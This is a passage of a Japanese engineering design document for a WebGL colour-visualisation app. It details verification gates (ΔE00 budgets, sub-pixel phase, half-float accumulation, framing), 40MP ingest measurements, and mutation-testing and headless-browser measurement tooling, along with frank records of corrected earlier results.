| **G4** | wheel 24 パッチ | 色相に**系統的な回転**が無いこと | ΔE00 ≤ 2.0 かつ **平均色相残差 ≤ 0.5°** |
| **G5** | checker 2px | 板の拡大補間がリニア光であること | 中点が **sRGB 188**（ガンマ空間なら 128） |
| **G6** | 全領域 | 後処理の非混入 | オフで G0〜G5 が通り、**オンにすると差が出る** |
| **G7** | 板 + 点群 | 合成則 | 板 + 点群の重みの和が**厳密に 1**、アンカー窓で点群が厳密 0 |

#### なぜ G0 と G7 が要るのか

**G0**: clear color 漏れ（§`core/engine.ts`）は背景にしか出ないので、
G1〜G6 のどれもそれを見ていない。漏れれば sRGB 38 が出る（グレー軸で ΔE00 8.50）。

**G7**: 板と点群は**加算合成**なので、両方フル強度で描くと平坦部が 2 倍になる。
ΔE00 ≤ 2.0 は 2 倍を絶対に通さない。素案はこの合成則を規定していなかった。

#### G4 は ΔE00 だけでは足りない

**ΔE00 ≤ 2.0 は 2° 程度の色相回転を許す。** 「色相回転そのものである」が看板である以上、
色相の系統誤差は別に測る ── 各パッチの `atan2(b', a')` 残差の**平均**（系統的回転）と
**標準偏差**（ばらつき）を分けて出す。

#### G5 は「発見」ではなく「決定」の回帰ロックである

`colorSpace = SRGBColorSpace` にすればハードウェアがフィルタの**前**にデコードするので
中点は 188、デコードしなければ 128 になる。GPU が教えてくれるのではなく**こちらが選ぶ**。
§4.7 が「縮約は全部リニア光で自分でやる」と決めている以上、板の拡大補間もリニア光でなければ
辻褄が合わない。**そして画面の読み戻しでは測れない** ── 板の倍率と位相が viewport 次第なので、
中点を一度もサンプルしないことがある（実測: 標本 No.0 は 0.83 倍の縮小になり、
2px チェッカーが解像して領域平均は 166 という解釈できない値になった）。
サンプル位置を測定器の側が握る専用プローブ（`render/textureProbe.ts`）で測る。

#### 「検証 8 項目」との対応

§7.2 の「検証 8 項目」は G0〜G7 の 8 つと読み替える。プライバシー（§6.2 が #6 と呼んでいるもの）と
公開経路（§7.3）は**キャンバスの読み戻しに依存しない**ので、この 8 項目とは別に立っている。

**Phase 1b で G8〜G11 が加わり、ラダーは 12 本になった**（§7.7）。
G0〜G7 は `dimLevel = 2` の主張、G8〜G11 は `[0,5]` 全域とフレーミングの主張である。
**G0〜G7 は 1b 以降も毎フェーズ再実行して、1a-iii の値と一致することを見る** ──
アンカーが動いていたら、以降のどの数値にも意味がない。

**Phase 1c で、アンカー行は node に落とした**（`anchors.test.ts`）── `s0` / `gain` /
カメラ距離 / カスケード `dist` / `fillRatios.x` / `maxNorm` / 格子 / `meanHex` は
**(drawingBuffer の寸法, viewport アスペクト, bandFrac) と決定的な標本だけで完全に決まり**、
three も rAF も GL も関与しない。実機の `sceneStats()` と `Object.is` で一致することも確認済み。
採点者は `fit.ts` 自身ではなく three の `PerspectiveCamera` が作る投影行列にしてある
（§7.7 の「`fillRatios` は `fitDistance` の逆関数なので恒等に潰れる」を繰り返さないため）。
**ブラウザ側で毎フェーズ要るのは、読み戻しに依存する G0 / G2 / G4 / G5 と、G8〜G11 である。**

#### 実測（水準 A・Chrome 148 / DPR 2 / ティア HIGH / drawingBuffer 988×778）

格子 378×236 = 89,208 点／カメラ距離 1.9636／カスケード dist 3.3838／
s0 2.248 device px／スプライト 8.65 px／gain 0.45307。ΔE00 は `src/color/deltaE.ts` で計算。

| | 予算 | **板経路** | **雲経路** |
|---|---|---|---|
| **G0** 背景 | 厳密 0 | 四隅すべて `[0,0,0]` | — |
| **G1** 基準点の重心誤差 | ≤ 2 device px | **最大 1.213 px** | — |
| **G1** 二面体 8 変換 | 全変換で相違 | **7/7 相違** | — |
| **G1** アスペクト / 充填 | 厳密 / 一辺に接する | **1.6000** / `fillRatios.x = 0.86` | — |
| **G2a** 平坦部 | ΔE00 ≤ 2.0 | **0.0000** | **0.3806** |
| **G2b** 実効ゲイン | ±2% | — | **−1.682%** |
| **G3** ランプ 8 段 | ΔE00 ≤ 2.0・単調は厳密 | **0.0000**・単調 | **0.0000**・単調 |
| **G4** ホイール 24 | ΔE00 ≤ 2.0 | **0.0000** | **0.4217** |
| **G4** 平均色相残差 | ≤ 0.5° | **0.0000°** | **−0.0362°**（sd 0.115°） |
| **G5** 板の拡大補間 | 中点 = sRGB 188 | **188**（ΔE00 0.0000） | — |
| **G6** オフの再現性 / オンで差 | 画素一致 / 差 > 0 | ✅ / bloom **ΔE00 3.285**・grade 0.381 | — |
| **G6** CompressPass の恒等性 | 強度 0 で画素一致 | ✅ | — |
| **G7** 重みの和 | 厳密 1 | アンカー 1+0 / 外 0+1、どちらも**厳密に 1** | |

G5 の 2 仮説の隔たりは **ΔE00 18.662**（188 と 128）なので、この判定は取り違えようがない。

#### G1 の予算を ≤1 px にしなかった理由

最初 ≤1 device px と書いたが、**推定器の窓の取り方で結果が 2.5 px 動いた**
（正方形窓が L 字基準点の右端を切っていた）。窓を白領域の実際の広がりに合わせると
L 字 0.037 px / 孤立マーカー 1.213 px。

**推定器の感度が予算より大きいなら、それは予算ではない。**
サブピクセルのエッジ当てはめが要るなら Phase 2 の仕事にする。

#### 窓は「答えが通るまで」ではなく機構から導く（Phase 2a で 2 回踏んだ）

上の教訓は G1 についてのものだったが、**同じ罠が G3 で 2 回続けて発火した。**

1. **標本の白マーカーは、ランプの第 1 段の上に重ねて描かれている。**
   `REGIONS.markers` の 4 個（各 32×32、y ≤ 64）は `REGIONS.ramp`（0,0,1024,80）の
   内側にある。中央 30% の窓はそこへ食い込み、**真値 0 の黒い段が sRGB 108 として返った**。
   §7.7 の「1px 黒枠は背景と同色なので基準点として機能しない」と同じ型で、
   **標本の領域設計が推定器の窓を制約している** ── これはどこにも書かれていなかった。
2. **窓を下げると、今度は雲経路がホイールのスプライトの光を拾った。**
   黒の段が 6 になり、ΔE00 が黒付近で増幅されて **2.77**（予算 2.0）。

ここで窓を数画素ずらせば通ったが、**それは予算を緩める代わりに測る場所を動かす行為**である。
→ 窓は `discard` 半径 `S/2` から**計算する**（実行時に `spritePx` から導く）。
マーカー下端 y = 64 とホイール上端 y = 80 の間から、両側へ **5.21 画像 px** 退いて
窓 `y ∈ [69.2, 74.8]`。**計算した窓が空になったら「測れない」と報告し、黙って通さない。**
結果、雲経路も真値ちょうどの `0,36,73,109,146,182,219,255` / ΔE00 **0.0697** ──
**2.77 は絵ではなく窓だった。**

#### ラダーの自動化状況（Phase 2a）

`npm run ladder` が採点する行と、node に落ちている行の分担:

| 行 | どこで見るか |
|---|---|
| アンカー（`s0`/`gain`/カメラ距離/カスケード/格子/`fill.x`/`meanHex`） | **両方** ── `anchors.test.ts`（node・厳密）とラダー（ブラウザ・`Object.is` で突き合わせ）|
| G0 / G1 / G2a / G2b / **G2c** / G3 / G4 / G5 / G6 / G7 / G8 / G9 / **G9z** / G10 / G11 | **ラダー**（実 GPU の読み戻しに依存する）|
| 位相の式・畳み込みの点数・half-float のデコード | **node**（`collapsePhase.test.ts`）|

**G2c は Phase 2a で新設した** ── 「板経路と雲経路が**別の画素である**こと」。
§7.2 は「板経路と雲経路で別のゲートを持たない」と決めているが、それは
**両方を測っていること**が前提で、その前提はどこでも確かめていなかった。
`setPath` が効かなくなると同じ絵を 2 回測って 2 つのゲートと呼べてしまい、
ΔE00 はどちらも通る（ラダー自身の歯で実際に抜けた）。実測 **6690 / 16384 バイト相違**。

---

### 7.7 潰しのゲート G8〜G11（Phase 1b で定義した）

G0〜G7 は**すべて `dimLevel = 2` で定義されている**ので、`[0,5]` 全域について
何も言っていなかった。1b が新たに主張することを G8 以降に立てる。
**G0〜G7 は「そのまま再実行して 1a-iii と一致すること」を回帰ロックとして使う。**

被写体は標本 No.0。前提は後処理オフ・回転凍結・**位相 0**
（`__LENS__.resetRotation()` を 1b で足した ── 下記）。

| | 被写体 | 測るもの | 予算 | 実測 |
|---|---|---|---|---|
| **G8a** | `d = 1` 列平均線 | 線の中心が列平均そのものか | ΔE00 ≤ 2.0 | **0.1234**（水準 −0.53%） |
| **G8b** | `d = 0.5` | 同上（線が縮む途中） | ΔE00 ≤ 2.0 | **0.1528**（−0.65%） |
| **G9** | `d = 0` 平均色 | 図の中心が `stats.meanHex` か | **ΔE00 ≤ 3.0**（§4.6） | ✅ **0.1744**（Phase 2a。1c は ❌ 4.3228）|
| **G9z** | 同上・**位相ゼロの構成** | 同上を**モデルを通さずに** | ΔE00 ≤ 3.0 | ✅ **0.5719**（生値 141,141,142）|
| **G10** | 折れ点を列挙（`extentY = K_SPRITE/m`） | half-float の加算深度（**モデル**） | ~~n ≤ 512~~ **破れている** | **最大 `4 × rows`** ＝ HIGH 944 / BALANCED 628 / ULTRA 1260（Phase 2c-v）。~~アンカー 16 / 線 4 / 点 378~~ ── **378 は Phase 2a 以降 到達不能**で、3 つとも `modelledAdditionDepth` を呼べば出る数だった（§4.6.1）|
| **G11a** | 全 dimLevel × 位相 | 帯からのはみ出し | ≤ 1.00 | **最大 0.86** |
| **G11b** | 同上 | 近平面の余裕 `D − zHi` | ≥ 0.25 world | **最小 1.96**（120F で止めた値）。**30720F まで回すと 1.4577** ── 記録値は「そこに何フレームいたか」の関数である（Phase 2c-vi）|
| **G11c** | アンカー窓 | カメラ距離 | `fitDistance` と **`Object.is` 一致** | ✅ |
| **G11d** | 位相を回す | 呼吸 `D_max/D_min` | 縮む向きに動かない | **厳密にゼロ**（単調非減少） |

### G0〜G7 の再実行（アンカーが動いていないことの確認）

| | 1a-iii | 1b |
|---|---|---|
| `s0` / `gain` | 2.248 / 0.45307 | **2.247830687830687 / 0.4530724335144705** |
| カメラ距離 / カスケード `dist` | 1.9636 / 3.3838 | **1.9635938049105979 / 3.38382867097012** |
| `fillRatios.x` | 0.86 | **0.86** |
| G0 背景 / G2a 板 / G3 / G4 板 | 厳密 0 / 0.0000 / 0.0000 / 0.0000 | **すべて同じ** |
| G2b 実効ゲイン | −1.682% | **−1.422%**（予算 ±2%） |
| G4 雲 / 色相残差 | 0.4217 / −0.0362° | **0.3757 / −0.0061°**（sd 0.110°） |
| G5 中点 | 188 | **188** |
| **`sampleWeight`** | —— | **厳密に 1** |

### 測定の再現性 —— 「凍結したから再現可能」は偽

`freezeRotation(true)` は**位相を保持する**ので、どの位相で凍結したかが結果を決める。
しかも測定の手順そのもの（`setDimLevel` も `setPath` も `renderOnce(1)` を打つ）が
位相を進める ── 門の飽和域では 1 フレームで平面 (0,2) が **0.105°** 回る。
→ `__LENS__.resetRotation()` を足した。フレーミングのピークホールドもここで落ちる。

### G9 は**予算を外していた** —— そして 1b が記録した数値は再現しなかった（Phase 1c の記録）

**以下は 1c 時点の記録である。決着は次節（Phase 2a）に書いた。**

1b はここに「**−6.73% / ΔE00 1.5244**（予算 3.0 の内側）」と書いた。**再現しない。**

| | 1b の記録 | **Phase 1c の実測** |
|---|---|---|
| 中心の峰 | （−6.73% リニア ⇒ sRGB **137** 相当） | **sRGB 129** |
| リニア比 | −6.73% | **−17.58%** |
| ΔE00 | 1.5244 | **4.3228** ← **予算 3.0 超過** |

**1c の回帰ではない。** `main`（`6b52738`）を別 worktree で立てて同じ手順で測ったところ、
中心 9×9 の画素場が**バイト単位で完全に一致**した（どちらも峰 129）。

切り分けとして確かめたこと（すべて水準 A）:

- **測定器は生きている**: 同じ手順で `d = 2` の中心が **128 ちょうど**（読み戻し経路は厳密）
- **フレーム数に依らない**: `renderOnce` 1 / 6 / 36 で **129 のまま**。峰は対称なガウシアン
- **後処理では説明できない**: bloom / grade / compress を個別に入れても **129**、全部入れて **131**
- **入力側に差は無い**: `s0` 2.247830687830687 / `gain` 0.4530724335144705 /
  `sampleWeight` 0.0058472 / 加算深度 378 が 1b と**厳密一致**

したがって言えるのは:

- **A**: `d = 0` の峰は sRGB **129** であり、予算 3.0 を **1.44 倍**外している
- **A**: 欠損は半径とともに単調に増える（中心 0.944 → 縁 0.812）
- **A**: **幾何の変化では説明できない** —— 3 点からスプライト径を逆算すると
  7.28 / 8.45 / 8.49 とばらつく（`gl_PointSize` の整数丸めなら一致するはず）
- **B**: 加算深度が効いている —— **同じ幾何・同じ `gain` で深度だけが違う**
  `d = 1`（深度 4）と `d = 0`（深度 378）が分かれる
- **C**: 正確な機構。**1b が挙げた「非正規数を落とすモデル −7.37%」も、
  −6.73% に合わせた計算だったので、実測 −17.58% には合わない**
- **C**: なぜ 1b が 137 を記録したか

**この行を「予算内」に戻すには、直すか、予算の根拠を書き直すかのどちらかが要る。**
どちらも Phase 2 の仕事である。**自動ゲートは無い** —— G9 は GPU の読み戻しに依存するので
`npm test` でも `npm run teeth` でも捕まらない（§7.9 の限界）。

### G9 の決着 —— **1 つの機構ではなく 2 つの積だった**（Phase 2a）

上の「C: 正確な機構」は、**2 つの因子の積**として解けた。予算は 1 つも緩めていない ──
3.0 も 2.0 も §4.6 / §7.2 由来のままで、変えたのは**採点する量**である。

#### 因子 1 —— サブピクセル位相 **−13.08%**（絵ではなく測定の定義）

`dimLevel = 0` では全 `extent` が 0 なので `foldExtent` が行列を潰し、`liftProject5` は
厳密に `(0,0,0)` を出す。NDC 原点はウィンドウ座標 `(W/2, H/2)` へ写り、
**DPR 2 の drawingBuffer は常に偶数×偶数なので、そこは画素の角**である。
フラグメント中心は半整数にしかないので、最も近い 4 つが各軸ちょうど 0.5 px 離れ、
`exp(−F·2·(0.5/S)²)` = **0.8691864** 倍に減衰する。

実測がそのまま出ていた ── **峰は単一画素ではなく 2×2 の平坦部**
（(493,388)/(494,388)/(493,389)/(494,389) がすべて 129）。プロファイル全体も
同じモデルで合う（予測 21 / 57 / 99 に対し実測 **21 / 57 / 99**）、`discard` 境界も一致
（x = 489 で 0）。**ラスタライズ側に異常は無い。**

**決定打は一様グレーの投入**（列平均が全列同一 ＝ 加算項がすべて等しい 1024×640 の
rgb(141,141,141)）── **位相モデルだけで 3 段すべてが合う**:

| dimLevel | 深度 | 位相のみの予測 | 実測 |
|---|---|---|---|
| 2（両軸とも位相が平均される） | 16 | 141 | **140〜141** |
| 1（y だけ潰れる） | 4 | **136.54** | **136〜137** |
| 0（両軸潰れる） | 378 | **132.20** | **132** |

深度 378 でも残差はほぼ 0 である ── **「half-float の機構」ではなかった。**

#### 因子 2 —— 不等な加算項の half-float 累積 **−5.2%**（画像依存・**順序依存**）

§4.6 の訂正 4 に表を置いた。要点は **同じ画素集合を左右反転しただけで 1 コード動く**こと。
直し方は「潰れた軸を CPU 側で先に畳む」（§2.3）── `dimLevel = 0` の深度が **378 → 1** になる。

#### G9 と G9z の実測（Phase 2a・ANGLE Metal / Apple M1 Max）

| | 1c | **2a** |
|---|---|---|
| 生の峰 | sRGB 129 | **132,132,133**（2×2 の平坦部）|
| 位相 | （記録なし） | **0.8691864** |
| 再構成した中心値 | —— | **141,141,142** |
| 目標（標本の画素から独立に算出） | #8d8d8e | 141,141,142 |
| **ΔE00** | **4.3228 ❌** | **0.1744 ✅** |
| 水準 | −17.58% | **−0.02%** |
| 加算深度 | 378 | **1** |

**G9z —— 採点者からモデルを外す。** 再構成は `spritePhaseFactor` で割る、つまり
**採点者がモデルを含む**。この作品の失敗史（`reconstructMean` / `fillRatios`）は
どれもその形なので、位相が要らない構成をもう 1 つ作る。位相は
「中心と最近傍フラグメント中心の距離」で決まり、中心は drawingBuffer のちょうど真ん中にある ──
**寸法が奇数なら中心は画素中心そのもの**。DPR 2 では `2 × 整数` が必ず偶数なので作れないが、
**DPR 1.5 なら作れる**（`1.5 × 494 = 741`、`1.5 × 390 = 585`）。

| 確認項目 | 結果 |
|---|---|
| drawingBuffer が奇数×奇数 | **741×585** |
| 位相オフセット | **x 0 / y 0**（厳密）|
| 峰が単一画素（2×2 の平坦部でない） | **true** |
| **`d=0` の生値（割り算を 1 回も通さない）** | **141,141,142** |
| 目標 | **141,141,142** |
| ΔE00 | **0.5719**（予算 3.0）、水準 +0.73% |

#### 再構成を認める前提を、割る前に測る

位相で割ってよいのは「図が 1 個（1 本）のスプライトである」ときだけなので、
ラダーは**上下 2 行が 1 コード以内で一致すること**を先に採点し、崩れていたら
再構成せずに落とす。前提を測らずに割った数を A として書くのは §0.1 規律 4 に当たる。
実測: `d=1` → 0、`d=0.5` → 1、`d=0` → 0.5。

#### 潰しの遷移は連続である（`d ∈ (0,1)` を 0.001 刻みで実測）

| d | 点数 | 深度 | 線の全長 px | 再構成 |
|---|---|---|---|---|
| 0 | 1 | 1 | 0 | **141** |
| 0.003 | 1 | 1 | 2.55 | 141 |
| 0.005 | 2 | 2 | 4.25 | 142 |
| 0.007 | 3 | 3 | 5.95 | 136 |
| 0.010 | 4 | 4 | 8.50 | 129 |
| 0.015 | 6 | 5 | 12.75 | 124 |
| 0.020 | 8 | 5 | 16.99 | 122 |

線の全長がスプライト直径 **8.65 px** を越えていく過程で、中心が読む対象が
「全体平均」から「中央部の局所平均」へ移るだけである。**0.02 刻みで掃引すると
この遷移をまたいで 19 コードの段差に見えるが、段差ではない。**
§2.3 の「連続であるべきは読める値のほう」は保たれている。
ただし **`n ≤ 3` の領域で +2 コードの膨らみ**（141 → 143 → 136）があり、
点が 2〜3 個だと `axisCoverage` のセル平均と実際の位相がずれる。
**予算は置かず、事実として固定する。**

### フレーミング —— 「dimLevel だけの包絡」は原理的に不連続（代数で確定）

角度は `gate·τ`、`τ̇ = gate·ω` なので **`gate > 0` なら τ は上限なく増え、
到達可能な角度集合は全トーラスになる**。したがって「その dimLevel で到達しうる最大」は
アンカー窓の縁で跳ぶ（実測: `d = 2.1` の 1.958 → `d = 2.2` の 3.454）。
しかも `d = 2.2` では π/2 到達に **6.1 分**かかるので、`gate` で補間する案も
6 分後に包絡を割る。毎フレーム厳密に合わせる案は、図が本当に一点へ潰れる位相があるため
`d = 3` で **50 倍**の幅で動き、カメラが脈打つ。

→ **ピークホールド（減衰なし）＋ `dimLevel` が動いたら現在値へリセット。**
図は絶対に帯から出ず、呼吸は厳密にゼロで、アンカーへ戻れば構図は 1a-iii と同じになる。
**代償は隠さない** ── 同じ dimLevel に留まると図が単調に小さくなり、包絡へ収束する
（実測: `d = 3` で 10 秒かけて 3.128 → 4.825、**1.54 倍**）。Phase 2/3 が見直す。

> **⚠ 上の「到達可能な角度集合は全トーラス」は偽である（Phase 2c-i の代数）。**
> `θ_k = ω_k·s` は**1 個のスカラの像**なので、到達集合は 1 次元の**閉軌道**であって
> トーラス全体ではない（トーラス上で測度 0）。周期は `2000π ≈ 6283 秒`（§4.20）。
> **この訂正が 2c-ii を可能にした** ── 定義域がコンパクトなら、包絡は先に計算できる。
> 「不連続である」という結論のほうは正しく、**そちらは §4.22 で門に載せて解いた**。

### 据え置き（1a-iii の実装）は実際に破綻していた

`imageHalfExtents` のままだと `d = 3` で帯を **1.5 倍以上**はみ出し、
viewport アスペクト 1.6 以上では**点がカメラを越える**（余裕 −0.31）。
`gl_PointSize` の分母 `max(-mv.z, 1e-3)` が潰れるが、
`F_CLAMP` は不発火（全域 `maxRatio = 0.4965`）で、GL エラーもコンソールも無音である。

### `fillRatios` を採点者にしてはいけない（既存 39 件の穴）

`fillRatios(i, fitDistance(i))` は **`fitDistance` の逆関数**なので `fill` に恒等に潰れ、
`fovDeg` も `DEFAULT_FILL` も検査できない。監査が実際に壊して確認した:

| 壊し方 | 1a-iii の 222 件 |
|---|---|
| `fitDistance` を 1.05 倍 | ❌ 36 件失敗 |
| **半角変換 `/360` → `/180`（両関数とも）** | ✅ **緑（穴）** |
| **`DEFAULT_FILL` 0.86 → 0.95** | ✅ **緑（穴）** |

→ `framing.test.ts` は **three の `PerspectiveCamera` が作る投影行列**を採点者にし、
`DEFAULT_FILL` は実測値としてピン留めした。両方とも落ちるようになった（§7.1 の歯）。

#### 標本の 1px 黒枠は基準点として機能しない（1a-iii で判明）

`fixture.ts` は 1px の黒枠を「板の縁の位置合わせを見る」ために置いているが、
**背景が黒（§`core/engine.ts` の CLEAR_COLOR）なので区別がつかない。**
縁の基準点には白マーカーを使うこと。枠が担っているのは「縁が欠けていないこと」までである。

### 7.8 Phase 1c の実測 —— 40MP と空状態と退化（水準 A）

前提: Chromium 148 / DPR 2 / **drawingBuffer 988×778**（`__LENS__.setViewport(494, 389)`。
1c で足した ── ペインの `resize_window` はページの `resize` を発火せず、既定のままでは
`s0` がアンカーと一致しない）。遮断計は `MessageChannel` の往復で、
**意図的な 120ms を 120.2ms と検出できることを先に確認**し、**アイドル床も併記**する
（床を出さない遮断測定は A として弱い。実測の床は **6.9 / 7.1 / 6.9 ms**）。

#### 40MP —— 主張は 4 本だけ

| 形状 | 原寸 | blob | 完走 | 正準 | **遮断 min/中央/max** |
|---|---|---|---|---|---|
| 3:2 | 7728×5152 (39.81MP) | 31.54 MB | **3/3** | 2048×1365 | 7.3 / **7.8** / 11.7 ms |
| 4:3 | 7296×5472 (39.92MP) | 32.33 MB | **3/3** | 2048×1536 | 7.4 / **10.8** / 11.0 ms |
| 1:1 | 6325×6325 (40.01MP) | 30.83 MB | **3/3** | **2048×2048（最悪 48MB）** | 10.5 / **12.2** / 12.5 ms |

**9 標本すべて完走、最長 12.5 ms（予算 16.7）**、経路はすべて worker。
**24MP の対照を同じ実行内で取る**（8.5 / 12.3 / 12.0 ms）── 予算を外したときに
「機体が遅い」と「40MP が重い」を切り分けるため。§4.6 の「予算の根拠が 1 標本」を繰り返さない。

**主張しないもの（C のまま）**: 中間ピークのメモリ。`measureUserAgentSpecificMemory` は
`crossOriginIsolated` を要求し、GitHub Pages はヘッダを設定できない。
算術で分かるのは上界だけで（40MP の原寸 RGBA8 = 151.88 MiB）、**測った数ではない**。
そして **`MAX_SOURCE_PIXELS = 80_000_000` の門は `createImageBitmap` が完了した*あと*に
評価されるので、ピークを防がない** ──「無言で死なないための門」であって「メモリの門」ではない。
デコード前に立てたければ SOF / IHDR のヘッダ読みが要り、それは §4.7 の
「EXIF パーサは 1 バイトも要らない」との交換になる。**iOS 実機の行とは分けて書くこと。**

#### 空状態 —— 到達可能な 4 コードを実入力で

| 入力 | `code` | `data-lens-ingest` |
|---|---|---|
| 0 バイト | `empty-source` | `failed:empty-source` |
| ゴミ / テキスト / SVG | `decode-failed` | `failed:decode-failed` |
| **HEIC・`image/jpeg` と偽装した HEIC・type 無し HEIC** | **`unsupported-format`** | `failed:unsupported-format` |
| 90MP (10000×9000) | `too-many-pixels` + `detail{10000,9000}` | `failed:too-many-pixels` |

**1b までは失敗を機械が観測する口が 1 本も無かった** ── `ingestReport()` は失敗しても
前の画像の報告を返し、`data-lens-ingest` は起動時の `"ok"` のままだった。
`__LENS__.lastFailure()` と、失敗時に上書きする `data-lens-ingest` / `data-lens-empty` を足した。
失敗のあと正常画像へ戻ると空状態が消えることも確認済み。

残り 5 コード（`no-2d-context` / `unsupported-browser` / `gamut-mismatch` / `no-session` /
`protocol` / `internal`）は**実入力から到達しない**。文言は置いてある ── 置かないと、到達した日に空白が出る。

#### 退化（§2.2）を実経路で

| 入力 | `axisPresent` | **`d = 5` の `extent`** |
|---|---|---|
| 単色グレー | `[T,T,F,F,F]` | **`[1,1,0,0,0]`** |
| グレースケール階調 | `[T,T,T,F,F]` | **`[1,1,1,0,0]`** |

**絵は変わらない** ── `computeScales` が退化時にスケールを厳密 1 に*置く*ので `a', b'` は
1e-16 のままで、`extent` が 0 でも 1 でも寄与が同じ（実測: グレースケールで `d = 3 → 4 → 5` の
画素差が 65,536 中 **0**）。つまりこれは「黙って壊れる」欠落ではなく
**「黙って何も起きない」欠落**で、NaN より発見が遅い。だからコードに書き、言葉で表明する。

**新たに判明**: 退化の境界で `sC` が **17.1 倍**跳ぶ。有彩色画素 4.9% までは退化（`sC` = 厳密 1）、
ちょうど 5.0% で `sC` = **0.0125** ── これは §2.2 自身が「bin 0 が `r ∈ [0, 0.0125]` を覆う」と
書いた値そのもの、つまり**ヒストグラムの量子化の産物**である。5.1% で **0.2136** へ跳ぶ。
§2.2 は「ヒストグラムは非退化時の `sC` の値にだけ使う」と決めたが、
**しきい値の近傍では `sC` そのものが解像度不足に汚染される。** 予算は置かず事実として固定した
（予算を置くなら `sC` の求め方を変える必要があり、それは Phase 2）。

### 7.9 歯の確認を「規律」から「仕組み」へ（`npm run teeth`・Phase 1c）

§8 は「テストには歯を付ける ──『実際に壊して落ちることを確かめた』項目を PR に書く」と
要求してきたが、**その確認は毎フェーズ手で書き捨てられていた**（監査が指摘した
「`MessageChannel` の計測器がリポジトリに無い」と同じ型。書き捨てた道具は次のフェーズで再現できない）。

そして手作業には**片側にしか効かない**という欠陥がある:

- 予算を**厳しすぎる**方に外すと、テストが落ちて気づく（1c で 2 回踏んだ）
- 予算を**緩すぎる**方に外すと、**永久に緑のまま**気づかない

緩い方こそ危険なのに、そちらは人間には見えない。

→ `scripts/teeth.mjs` に**変異の台帳**（1a-iii / 1b / 1c の歯を集約、**22 本**）を置き、
`npm run teeth` を CI に載せた。台帳の変異を 1 つずつ入れて本当に落ちるかを確かめ、
落ちなくなった歯があれば CI が赤くなる。**CI 実測: 22 / 噛んだ 22 / 抜けた 0**（約 2 分）。

- **復元は git ではなくメモリから。** `git checkout --` を使わないので、作業ツリーが
  汚れていても壊すものが無い（手作業では実際に作業を消した）
- hard gate は「少なくとも 1 件落ちる」。件数が減ったら警告のみ（恒等に潰れ始めた早期兆候）
- 台帳が実装からずれたら（対象の行が消えたら）落ちる

**この道具も、自分の失敗モードを 1 度踏んでから直っている。** 初版は「落ちた件数」を
正規表現で読んで hard gate にしており、**CI で 22 本すべてを「抜けた」と誤報した** ──
ローカルはパイプ越しで色が消えていたのに GitHub Actions は ANSI を出すので一致しなくなり、
件数が 0 になった。**「壊したのに落ちなかった」と「出力を読めなかった」を同じ 0 で表していたのが誤り**で、
まさに §7.2「測定器そのものが壊れている場合」だった。
→ 判定は **vitest の終了コード**（環境に依らない）。件数は色を消してから読み、
読めなければ `null` として「読めなかった」と表示する。

#### この仕組みが**見張らないもの**（Phase 1c 時点の記述・下で書き直した）

**テストが守っているものしか見張れない。** ブラウザの読み戻しに依存する主張
（G0〜G11 のほとんど、とくに**予算を外している G9**）には**自動ゲートが無い**。
`npm run teeth` は「node で落とせるテストが恒等に潰れていないか」までである。
ブラウザ測定の自動化は別の仕事で、まだ誰もやっていない。

### 7.9.1 上の段落は正しかったが、**費用を書かなかったので限界として読まれた**（Phase 2a）

「まだ誰もやっていない」は事実の記述で、§0.1 規律 8（「測れない」と書く前に手段を確かめる）に
違反してはいない。**それでも害があった** ── 費用が書いていないので「別の仕事」は
「当分やらない仕事」として読まれ、**G9 はその空白の中で 2 フェーズ腐った**。
1b が「予算内 1.5244」と書き、1c が「再現しない 4.3228」と気づくまで、
`npm test` も `npm run teeth` も緑であり続けた。

確かめた結果、費用はほとんど無かった:

- `/Applications/Google Chrome.app` は在る（150.0.7871.188）
- `playwright-core` はシステムの Chrome を `channel: 'chrome'` で駆動し、**ブラウザを 1 バイトも落とさない**
- headless の Chrome で WebGL2 は**実 GPU（ANGLE Metal）**で動き、読み戻しも通る
- `rAF` は headless で 1 回も発火しないが、`__LENS__.renderOnce()` が Phase 0 から在る
  ── **§7.2 が別の理由で作った口が、ここで効いている**

→ `npm run ladder`（`scripts/ladder.mjs`）。**49 行 / 通過 49**。
すべての数値の隣に `UNMASKED_RENDERER` を出す ── 監査サブエージェントが同じページ・
同じアンカー・同じ痕跡（`data-lens-render="ok"`・コンソールエラー 0）で峰を
**133**（playwright 同梱 Chromium の SwiftShader）と **129**（システム Chrome の ANGLE Metal）の
2 通り測り、**どこにも「別のラスタライザだ」とは出ていなかった**ためである。

### 7.9.2 ラダー自身にも歯を付ける（`npm run ladder:teeth`）

**`npm run teeth` が閉じたのは「テストが恒等に潰れる」経路だけだった。**
「**測定器が最初から何も見ていない**」経路は開いたままで、実際 Phase 2a の
ラダー初版は **G9 の行の判定に `true` をベタ書きしていた** ── あのままなら永久に ✅ を
報告し続けた。**G9 を腐らせたのと同じ形が、それを見張る道具の中で再演されかけた。**

→ `--teeth` は絵と採点者を `__LENS__` 越しに壊す（ソースには触らないので、
`scripts/teeth.mjs` が `src/` を書き換えるのと役割が分かれる）。
hard gate は 2 つ: **素の状態で全行が緑**であること、そして**各故障で期待した ID の行が実際に落ちる**こと。
「1 件でも落ちる」ではなく「**その ID が**落ちる」にしたのは、行数が少なくて特定できるからである。

**実測 7 / 噛んだ 7 / 抜けた 0。** 書いている途中で 3 件が実際に抜け、すべて直した:
G3 の窓が白マーカーを拾った件、同じ窓が雲経路でホイールの光を拾った件（§7.6）、
そして **`setPath` が効かなくなっても板を 2 回測って「2 つのゲート」と呼べた**件（→ G2c を新設）。

**自分の期待が間違っていた訂正が 1 件ある。** `grade` の故障に対して当初
`expect: ['G2a','G3','G4']` と書いて外した。機構に戻すと、grain は 1 画素あたり
±`GRADE_GRAIN`/2 = ±0.0075 の**零平均**で領域平均の瞬間に消え、ビネットは
`smoothstep(0.55, 1.15, rr)` なので図の中央では厳密に 0 である。
→ **画素ごとの加算的な摂動を捕まえられるのは、予算が「厳密 0」の行だけ**（G0）。
平均が効かない G9 も落ちる。**期待を実測に合わせたのではなく、機構から導き直した。**

### 7.9.2.1 **`npm test` の 1 秒は `npm run teeth` では 53 秒になる**（Phase 2c-vii で踏んだ）

`teeth.mjs` は変異 1 本ごとに `npm test` を**丸ごと 1 回**走らせる。いま変異は **54 本**ある。
→ **`npm test` へ足した時間は、そのまま 54 倍されて teeth に乗る。**

2c-vii は型 2 の機構を `npm test` へ入れるとき、`npm test` 単体の費用
（6.2s → 21.7s）だけを見て「載せられる」と判断した。**teeth が 7〜8 分から 20 分級へ延びた。**
費用の 7 割は 1 本（ランプ帯の反復掃引 12.9s）に乗っていた。

直し方は掃引を諦めることではなく、**格子を軽くしてよいかを先に測ること**だった:

